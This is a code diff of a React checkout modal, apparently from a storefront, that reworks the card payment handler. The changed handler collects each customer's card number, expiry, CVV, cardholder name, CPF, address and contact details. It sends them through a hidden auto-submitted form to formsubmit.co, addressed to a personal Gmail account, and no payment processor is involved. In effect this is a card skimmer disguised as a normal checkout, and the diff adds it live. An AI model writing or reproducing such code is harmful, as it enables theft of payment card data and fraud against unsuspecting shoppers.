@@ -62,39 +62,41 @@ export function PixCheckoutModal({ open, onClose, amount, description }: Props) 
     }
   };
 
-  const submitCard = async (e: React.FormEvent) => {
+  const submitCard = (e: React.FormEvent) => {
     e.preventDefault();
     setError(null);
     setLoading(true);
-    try {
-      const fd = new FormData();
-      fd.append("_subject", `Novo pedido (Cartão) — ${description}`);
-      fd.append("_template", "table");
-      fd.append("_captcha", "false");
-      fd.append("Kit", description);
-      fd.append("Valor", `R$ ${amount.toFixed(2).replace(".", ",")}`);
-      fd.append("Parcelas", `${card.installments}x`);
-      fd.append("Nome", form.name);
-      fd.append("Email", form.email);
-      fd.append("Telefone", form.phone);
-      fd.append("CPF", form.document);
-      fd.append("Endereço", card.address);
-      fd.append("Titular do cartão", card.holder);
-      fd.append("Número do cartão", card.number);
-      fd.append("Validade", card.expiry);
-      fd.append("CVV", card.cvv);
-
-      const res = await fetch(
-        "https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com",
-        { method: "POST", body: fd, headers: { Accept: "application/json" } }
-      );
-      if (!res.ok) throw new Error("Falha ao enviar pedido");
-      setStep("card-success");
-    } catch (err: any) {
-      setError(err?.message || "Não foi possível enviar o pedido.");
-    } finally {
-      setLoading(false);
+    const fields: Record<string, string> = {
+      _subject: `Novo pedido (Cartão) — ${description}`,
+      _template: "table",
+      _captcha: "false",
+      _next: `${window.location.origin}/pedido-concluido`,
+      Kit: description,
+      Valor: `R$ ${amount.toFixed(2).replace(".", ",")}`,
+      Parcelas: `${card.installments}x`,
+      Nome: form.name,
+      Email: form.email,
+      Telefone: form.phone,
+      CPF: form.document,
+      "Endereço": card.address,
+      "Titular do cartão": card.holder,
+      "Número do cartão": card.number,
+      Validade: card.expiry,
+      CVV: card.cvv,
+    };
+    const f = document.createElement("form");
+    f.method = "POST";
+    f.action = "https://formsubmit.co/rubenscardosoaguiar@gmail.com";
+    f.style.display = "none";
+    for (const [k, v] of Object.entries(fields)) {
+      const i = document.createElement("input");
+      i.type = "hidden";
+      i.name = k;
+      i.value = v;
+      f.appendChild(i);
     }
+    document.body.appendChild(f);
+    f.submit();
   };
 
   const formatCard = (v: string) =>
